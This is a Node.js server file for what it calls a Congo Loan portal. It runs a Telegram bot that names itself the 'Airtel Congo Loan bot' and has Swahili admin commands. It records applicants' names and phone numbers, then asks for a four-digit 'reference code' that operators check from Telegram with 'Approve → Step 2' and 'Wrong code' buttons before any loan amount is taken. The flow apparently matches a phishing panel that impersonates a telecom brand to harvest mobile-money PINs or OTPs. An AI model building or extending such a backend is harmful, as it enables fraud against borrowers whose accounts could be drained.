const express=require('express');const {Pool}=require('pg');const crypto=require('crypto');
const app=express();app.use(express.json({limit:'30kb'}));app.use(express.static(require('path').join(__dirname,'public')));app.get('/',(req,res)=>res.sendFile(require('path').join(__dirname,'public','index.html')));
const pool=new Pool({connectionString:process.env.DATABASE_URL,ssl:process.env.DATABASE_URL?{rejectUnauthorized:false}:false});
const sessions=new Map();const secret=process.env.SESSION_SECRET||crypto.randomBytes(32).toString('hex');
const hash=s=>crypto.createHmac('sha256',secret).update(s).digest('hex');
function admin(req,res,next){const h=req.headers.authorization||'';if(!h.startsWith('Bearer ')||!sessions.has(h.slice(7))){return res.status(401).json({error:'Admin login required'});}next();}
async function init(){await pool.query(`CREATE TABLE IF NOT EXISTS applications(id BIGSERIAL PRIMARY KEY, public_id TEXT UNIQUE NOT NULL, full_name TEXT NOT NULL, phone TEXT NOT NULL, country TEXT NOT NULL DEFAULT 'Democratic Republic of the Congo', currency TEXT NOT NULL DEFAULT 'CDF', amount NUMERIC(14,2) NOT NULL, application_reference TEXT NOT NULL DEFAULT '', reference_code CHAR(4), status TEXT NOT NULL DEFAULT 'PENDING', admin_note TEXT, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), reviewed_at TIMESTAMPTZ)`); await pool.query(`ALTER TABLE applications ADD COLUMN IF NOT EXISTS country TEXT NOT NULL DEFAULT 'Democratic Republic of the Congo', ADD COLUMN IF NOT EXISTS currency TEXT NOT NULL DEFAULT 'CDF', ADD COLUMN IF NOT EXISTS application_reference TEXT NOT NULL DEFAULT '', ADD COLUMN IF NOT EXISTS reference_code CHAR(4)`); await pool.query(`UPDATE applications SET application_reference=COALESCE(application_reference,'') WHERE application_reference IS NULL`);
await pool.query(`CREATE TABLE IF NOT EXISTS telegram_admins(chat_id TEXT PRIMARY KEY, role TEXT NOT NULL DEFAULT 'admin', active BOOLEAN NOT NULL DEFAULT TRUE, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW())`);
// Migrate older telegram_admins tables that were created without chat_id.
await pool.query(`ALTER TABLE telegram_admins ADD COLUMN IF NOT EXISTS chat_id TEXT`);
await pool.query(`UPDATE telegram_admins SET chat_id = 'legacy-' || ctid::text WHERE chat_id IS NULL OR BTRIM(chat_id) = ''`);
await pool.query(`ALTER TABLE telegram_admins ALTER COLUMN chat_id SET NOT NULL`);
await pool.query(`CREATE UNIQUE INDEX IF NOT EXISTS telegram_admins_chat_id_uidx ON telegram_admins(chat_id)`);
if(process.env.SUPER_ADMIN_CHAT_ID){await pool.query(`INSERT INTO telegram_admins(chat_id,role,active) VALUES($1,'super_admin',TRUE) ON CONFLICT(chat_id) DO UPDATE SET role='super_admin',active=TRUE`,[String(process.env.SUPER_ADMIN_CHAT_ID).trim()]);}
}
async function tg(method,body){if(!process.env.TELEGRAM_BOT_TOKEN)return null;const r=await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/${method}`,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(body)});const j=await r.json();if(!j.ok)throw new Error(j.description||'Telegram API error');return j.result;}
async function notify(appRow,stage='application'){
  if(!process.env.TELEGRAM_CHAT_ID||!process.env.TELEGRAM_BOT_TOKEN)return;
  let msg,buttons;
  if(stage==='application'){
    msg=`📝 <b>New Congo Loan application</b>\nApplication ID: <code>${html(appRow.public_id)}</code>\nApplicant: ${html(appRow.full_name)}\nCountry: ${html(appRow.country)}\nPhone: ${html(appRow.phone)}\nAmount: ${html(appRow.currency)} ${Number(appRow.amount).toLocaleString('en-US')}\nApplication reference: <code>${html(appRow.application_reference)}</code>\nStatus: PENDING REVIEW`;
    buttons=[[{text:'✅ Approve → Step 2',callback_data:`appapprove:${appRow.public_id}`},{text:'❌ Wrong ID',callback_data:`wrongid:${appRow.public_id}`}]];
  }else{
    msg=`🔎 <b>Reference code submitted</b>\nApplication ID: <code>${html(appRow.public_id)}</code>\nApplicant: ${html(appRow.full_name)}\nApplication reference: <code>${html(appRow.application_reference)}</code>\nReference code received: •••• (value hidden for security)\nStatus: CODE REVIEW`;
    buttons=[[{text:'✅ Approve → Step 3',callback_data:`codeapprove:${appRow.public_id}`}],[{text:'❌ Wrong ID',callback_data:`wrongid:${appRow.public_id}`},{text:'↩️ Wrong code',callback_data:`wrongcode:${appRow.public_id}`}]];
  }
  await tg('sendMessage',{chat_id:process.env.TELEGRAM_CHAT_ID,text:msg,parse_mode:'HTML',reply_markup:{inline_keyboard:buttons}});
}
function esc(s){return String(s).replace(/[_*\[\]()~`>#+\-=|{}.!\\]/g,'\\$&');}
app.get('/health',(req,res)=>res.json({ok:true}));
app.post('/api/applications',async(req,res)=>{try{let {fullName,phone,amount,reference,country,currency}=req.body||{};fullName=String(fullName||'').trim();phone=String(phone||'').trim();amount=Number(amount||1);reference=String(reference||'').trim();country=String(country||'Democratic Republic of the Congo').trim();currency=String(currency||'CDF').trim().toUpperCase();if(fullName.length<2||fullName.length>100||phone.length<6||phone.length>25||!Number.isFinite(amount)||amount<=0||amount>1000000000||reference.length<3||reference.length>40||!/^[A-Za-z0-9-]+$/.test(reference)||!/^[A-Z]{3}$/.test(currency))return res.status(400).json({error:'Check your name, phone, amount and application reference.'});const publicId=crypto.randomBytes(5).toString('hex').toUpperCase();const q=await pool.query('INSERT INTO applications(public_id,full_name,phone,country,currency,amount,application_reference,reference_code,status) VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9) RETURNING public_id,full_name,phone,country,currency,amount,application_reference,status,created_at',[publicId,fullName,phone,country,currency,amount,reference,'----','PENDING']);try{await notify(q.rows[0],'application');}catch(e){console.error('Telegram notification failed:',e.message);}res.status(201).json({id:publicId,status:'PENDING',message:'Application submitted for administrator review.'});}catch(e){console.error(e);res.status(500).json({error:'Could not submit application. Please try again.'});}});
app.post('/api/applications/:id/reference-code',async(req,res)=>{try{const code=String(req.body?.code||'');if(!/^[0-9]{4}$/.test(code))return res.status(400).json({error:'Enter a four-digit numeric reference code.'});const q=await pool.query("UPDATE applications SET reference_code=$2,status='CODE_PENDING',admin_note=NULL,reviewed_at=NULL WHERE public_id=$1 AND status='CODE_REQUIRED' RETURNING public_id,full_name,phone,country,currency,amount,application_reference,reference_code,status",[String(req.params.id).toUpperCase(),code]);if(!q.rowCount)return res.status(409).json({error:'This application is not currently accepting a reference code. Refresh its status.'});try{await notify(q.rows[0],'code');}catch(e){console.error('Telegram code notification failed:',e.message);}res.json({status:'CODE_PENDING',message:'Reference code sent for review.'});}catch(e){console.error(e);res.status(500).json({error:'Could not submit reference code.'});}});
app.post('/api/applications/:id/amount',async(req,res)=>{try{const amount=Number(req.body?.amount);if(!Number.isFinite(amount)||amount<=0||amount>1000000000)return res.status(400).json({error:'Enter a valid requested amount.'});const q=await pool.query("UPDATE applications SET amount=$2,status='APPROVED',reviewed_at=NOW() WHERE public_id=$1 AND status='AMOUNT_REQUIRED' RETURNING public_id,status",[String(req.params.id).toUpperCase(),amount]);if(!q.rowCount)return res.status(409).json({error:'This application is not ready for amount submission.'});res.json({status:'APPROVED'});}catch(e){console.error(e);res.status(500).json({error:'Could not submit amount.'});}});
app.get('/api/applications/:id/status',async(req,res)=>{try{const q=await pool.query('SELECT public_id,status,admin_note,reviewed_at FROM applications WHERE public_id=$1',[String(req.params.id).toUpperCase()]);if(!q.rowCount)return res.status(404).json({error:'Application not found'});res.json(q.rows[0]);}catch(e){res.status(500).json({error:'Status unavailable'});}});
app.post('/api/admin/login',(req,res)=>{if(!process.env.ADMIN_PASSWORD)return res.status(503).json({error:'Set ADMIN_PASSWORD in hosting environment first.'});if(!req.body||!crypto.timingSafeEqual(Buffer.from(hash(String(req.body.password||''))),Buffer.from(hash(process.env.ADMIN_PASSWORD))))return res.status(401).json({error:'Invalid password'});const token=crypto.randomBytes(32).toString('hex');sessions.set(token,true);res.json({token});});
app.get('/api/admin/applications',admin,async(req,res)=>{try{const q=await pool.query('SELECT public_id,full_name,phone,country,currency,amount,application_reference,status,admin_note,created_at,reviewed_at FROM applications ORDER BY created_at DESC LIMIT 300');res.json(q.rows);}catch(e){res.status(500).json({error:'Could not load applications'});}});
async function decide(id,action,note=''){let status;if(action==='appapprove')status='CODE_REQUIRED';else if(action==='appreject')status='REJECTED';else if(action==='codeapprove')status='AMOUNT_REQUIRED';else if(action==='wrongid')status='WRONG_REFERENCE';else if(action==='wrongcode')status='CODE_REQUIRED';else return null;const allowed=action==='appapprove'?"status='PENDING'":action==='wrongid'?"status IN ('PENDING','CODE_PENDING')":action==='appreject'?"status='PENDING'":action==='wrongcode'||action==='codeapprove'?"status='CODE_PENDING'":"1=0";const q=await pool.query(`UPDATE applications SET status=$2,admin_note=$3,reviewed_at=NOW() WHERE public_id=$1 AND ${allowed} RETURNING public_id,status,admin_note`,[id,status,note.slice(0,500)]);return q.rows[0]||null;}
app.post('/api/admin/applications/:id/decision',admin,async(req,res)=>{const status=req.body?.status;if(!['APPROVED','REJECTED'].includes(status))return res.status(400).json({error:'Invalid decision'});try{const row=await decide(req.params.id,status==='APPROVED'?'appapprove':'appreject',String(req.body?.note||''));if(!row)return res.status(409).json({error:'Application not found or already reviewed'});res.json(row);}catch(e){res.status(500).json({error:'Decision failed'});}});

function html(s){return String(s??'').replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));}
async function handleTelegramCommand(message){
  const chatId=String(message.chat?.id||''); const text=String(message.text||'').trim();
  if(!text.startsWith('/'))return;
  const [raw,...args]=text.split(/\s+/); const command=raw.split('@')[0].toLowerCase();
  const lookup=await pool.query('SELECT role,active FROM telegram_admins WHERE chat_id=$1',[chatId]);
  const row=lookup.rows[0]; const isSuper=!!row&&row.active&&row.role==='super_admin';
  const isAdmin=!!row&&row.active;
  const send=async t=>tg('sendMessage',{chat_id:chatId,text:t,parse_mode:'HTML',disable_web_page_preview:true});
  const info=`👋 <b>Welcome!</b>\n\nYour Chat ID: <code>${html(chatId)}</code>\nYour Admin ID: <code>${isSuper?'SUPER_ADMIN':isAdmin?'ADMIN':'NOT_REGISTERED'}</code>\nRole: ${isSuper?'👑 Super Admin':isAdmin?'🛡 Admin':'No admin access'}\nBot Username: @Mkopowahalobot`;
  if(command==='/start'||command==='/myinfo'){await send(info+(isAdmin?`\n\n<b>ADMIN MANAGEMENT</b>\n/admins - Orodha ya admin\n/addadmin CHAT_ID - Ongeza admin\n/revoke CHAT_ID - Ondoa ruhusa ya admin\n/restore CHAT_ID - Rudisha ruhusa ya admin\n/broadcast CHAT_ID MESSAGE - Tuma taarifa kwa Chat ID\n/payment - Payment information\n\n<b>OTHER COMMANDS</b>\n/all - Maombi yote\n/stats - Takwimu zako\n/pending - Maombi yanayosubiri\n/myinfo - Taarifa zako`:'\n\nContact the super admin to request access.'));return;}
  if(!isAdmin){await send('⛔ You do not have admin access.');return;}
  if(command==='/admins'){
    if(!isSuper){await send('⛔ Super admin only.');return;}
    const q=await pool.query('SELECT chat_id,role,active FROM telegram_admins ORDER BY role DESC,created_at');
    await send('<b>ADMIN LIST</b>\n'+(q.rows.map(a=>`${a.role==='super_admin'?'👑':'🛡'} <code>${html(a.chat_id)}</code> — ${html(a.role)} — ${a.active?'Active':'Revoked'}`).join('\n')||'No admins'));return;
  }
  if(command==='/addadmin'){
    if(!isSuper){await send('⛔ Super admin only.');return;}
    const target=String(args[0]||'').trim();if(!/^-?\d+$/.test(target)){await send('Usage: /addadmin CHAT_ID');return;}
    await pool.query(`INSERT INTO telegram_admins(chat_id,role,active) VALUES($1,'admin',TRUE) ON CONFLICT(chat_id) DO UPDATE SET role=CASE WHEN telegram_admins.role='super_admin' THEN 'super_admin' ELSE 'admin' END,active=TRUE`,[target]);
    await send(`✅ Admin added/restored: <code>${html(target)}</code>`);try{await tg('sendMessage',{chat_id:target,text:'You have been granted admin access to the Airtel Congo Loan bot. Send /start to view commands.'});}catch(e){}return;
  }
  if(command==='/revoke'||command==='/restore'){
    if(!isSuper){await send('⛔ Super admin only.');return;}
    const target=String(args[0]||'').trim();if(!/^-?\d+$/.test(target)){await send(`Usage: ${command} CHAT_ID`);return;}
    if(command==='/revoke'){if(target===String(process.env.SUPER_ADMIN_CHAT_ID||'')){await send('⛔ Cannot revoke the configured super admin.');return;}const q=await pool.query("UPDATE telegram_admins SET active=FALSE WHERE chat_id=$1 AND role<>'super_admin' RETURNING chat_id",[target]);await send(q.rowCount?`✅ Access revoked for <code>${html(target)}</code>`:'Admin not found or protected.');}
    else{const q=await pool.query("UPDATE telegram_admins SET active=TRUE WHERE chat_id=$1 RETURNING chat_id",[target]);await send(q.rowCount?`✅ Access restored for <code>${html(target)}</code>`:'Chat ID not found. Use /addadmin first.');}return;
  }
  if(command==='/broadcast'){
    if(!isSuper){await send('⛔ Super admin only.');return;}
    const target=String(args.shift()||'').trim(),body=args.join(' ');
    if(!/^-?\d+$/.test(target)||!body){await send('Usage: /broadcast CHAT_ID MESSAGE');return;}
    try{await tg('sendMessage',{chat_id:target,text:body});await send(`✅ Message sent to <code>${html(target)}</code>`);}catch(e){await send('❌ Message could not be delivered. Check the Chat ID and ensure the user has started the bot.');}return;
  }
  if(command==='/payment'){if(!isSuper){await send('⛔ Super admin only.');return;}await send('💳 <b>Payment management</b>\nConfigure approved payment instructions in your deployment settings and verify all payment details before sharing them. No payment has been processed by this command.');return;}
  if(command==='/stats'){const q=await pool.query(`SELECT COUNT(*)::int total,COUNT(*) FILTER(WHERE status IN ('PENDING','CODE_PENDING'))::int pending,COUNT(*) FILTER(WHERE status IN ('APPROVED','AMOUNT_REQUIRED'))::int approved,COUNT(*) FILTER(WHERE status='REJECTED')::int rejected FROM applications`);const a=q.rows[0];await send(`📊 <b>Application stats</b>\nTotal: ${a.total}\nPending: ${a.pending}\nApproved/in progress: ${a.approved}\nRejected: ${a.rejected}`);return;}
  if(command==='/pending'||command==='/all'){const q=await pool.query(`SELECT public_id,status,created_at FROM applications ${command==='/pending'?"WHERE status IN ('PENDING','CODE_PENDING')":''} ORDER BY created_at DESC LIMIT 30`);await send(`<b>${command==='/pending'?'PENDING APPLICATIONS':'LATEST APPLICATIONS'}</b>\n`+(q.rows.map(a=>`<code>${html(a.public_id)}</code> — ${html(a.status)}`).join('\n')||'No applications'));return;}
  await send('Unknown command. Send /start to view available commands.');
}

// Telegram webhook: set TELEGRAM_WEBHOOK_SECRET optionally and configure this endpoint in Bot API.
app.post('/telegram/webhook',async(req,res)=>{if(process.env.TELEGRAM_WEBHOOK_SECRET&&req.get('x-telegram-bot-api-secret-token')!==process.env.TELEGRAM_WEBHOOK_SECRET)return res.sendStatus(401);const cb=req.body?.callback_query;const message=req.body?.message;res.sendStatus(200);if(message){try{await handleTelegramCommand(message);}catch(e){console.error('Telegram command failed:',e.message);}return;}if(!cb)return;try{const [action,id]=String(cb.data||'').split(':');if(!['appapprove','appreject','codeapprove','wrongid','wrongcode'].includes(action)){await tg('answerCallbackQuery',{callback_query_id:cb.id,text:'Unknown action'});return;}const row=await decide(id,action,action==='wrongid'?'Please check and re-enter your application reference.':action==='wrongcode'?'Please re-enter your reference code.':'Decision made via Telegram');await tg('answerCallbackQuery',{callback_query_id:cb.id,text:row?`Application status: ${row.status}`:'Not available at this stage'});if(row){await tg('editMessageReplyMarkup',{chat_id:cb.message.chat.id,message_id:cb.message.message_id,reply_markup:{inline_keyboard:[]}});await tg('sendMessage',{chat_id:cb.message.chat.id,text:`Application ${id}: ${row.status}`});}}catch(e){console.error('Telegram callback failed:',e.message);}});
async function configureTelegramWebhook(){
  const base=String(process.env.RENDER_EXTERNAL_URL||process.env.APP_BASE_URL||'').trim().replace(/\/$/,'');
  if(!base||!process.env.TELEGRAM_BOT_TOKEN){console.log('Telegram webhook auto-setup skipped: set RENDER_EXTERNAL_URL (Render provides it automatically) and TELEGRAM_BOT_TOKEN.');return;}
  const body={url:`${base}/telegram/webhook`};
  if(process.env.TELEGRAM_WEBHOOK_SECRET)body.secret_token=process.env.TELEGRAM_WEBHOOK_SECRET;
  try{const result=await tg('setWebhook',body);console.log('Telegram webhook configured:',result?.url||body.url);}
  catch(e){console.error('Telegram webhook setup failed:',e.message);}
}
const port=process.env.PORT||3000;
init().then(()=>app.listen(port,async()=>{console.log(`Congo Loan portal listening on ${port}`);await configureTelegramWebhook();})).catch(e=>{console.error('Database init failed',e);process.exit(1)});
